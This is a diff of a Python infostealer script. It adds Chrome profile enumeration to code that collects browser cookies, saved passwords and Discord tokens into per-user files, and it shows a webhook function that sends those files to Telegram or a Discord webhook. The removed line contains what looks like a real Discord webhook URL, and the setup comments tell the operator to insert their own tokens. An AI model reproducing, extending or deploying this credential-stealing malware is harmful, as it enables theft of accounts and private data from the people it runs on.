@@ -28,14 +28,19 @@ browser_loc = {
     "Brave": local + "\\BraveSoftware\\Brave-Browser",
     "Edge": local + "\\Microsoft\\Edge",
     "Opera": roaming + "\\Opera Software\\Opera Stable",
-    "OperaGX": roaming + "\\Opera Software\\Opera GX Stable"
+    "OperaGX": roaming + "\\Opera Software\\Opera GX Stable",
 }
 
 fileCookies = "cooks_" + os.getlogin() + ".txt"
 filePass = "passes_" + os.getlogin() + ".txt"
 fileInfo = "info_" + os.getlogin() + ".txt"
 
-
+# CHROME PROFILES
+for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
+    if i.startswith("Profile "):
+        browser_loc["ChromeP"] = local + "\\Google\\Chrome\\User Data\\" + i
+        
+        
 # DISCORD TOKENS
 def decrypt_token(buff, master_key):
     try:
@@ -182,17 +187,24 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
             f.close()
 
 
+
 # PATH SHIT
 def Local_State(path):
     return f"{path}\\User Data\\Local State"
 
 
 def Login_Data(path):
-    return f"{path}\\User Data\\Default\\Login Data"
+    if "Profile" in path:
+        return path
+    else:
+        return f"{path}\\User Data\\Default\\Login Data"
 
 
 def Cookies(path):
-    return f"{path}\\User Data\\Default\\Network\\Cookies"
+    if "Profile" in path:
+        return path
+    else:
+        return f"{path}\\User Data\\Default\\Network\\Cookies"
 
 
 def main_tokens():
@@ -222,9 +234,9 @@ def decrypt_files(path, browser):
 
 # WEBHOOK
 def post_to(file):
-    token = "TELEGRAM TOKEN"  # put your token in here, if you don't wanna use telegram leave it like it is
+    token = "TELEGRAM TOKEN"     # put your token in here, if you don't wanna use telegram leave it like it is
     chat_id = "TELEGRAM CHATID"  # "    chatid          "                     telegram      "
-    webhook_url = "https://discord.com/api/webhooks/977513900088123473/r-86Ak2BebUndM9i0s_9bsPofWiL0jIOGKNtp0SOlQkUdUE9EBwXNEyiNcNjPBbSK42Q"  # "    webhook         "                     discord       "
+    webhook_url = "WEBHOOK URL"  # "    webhook         "                     discord       "
     # if you don't understand it you shouldn't use it
 
     if token == "TELEGRAM TOKEN":  # don't change
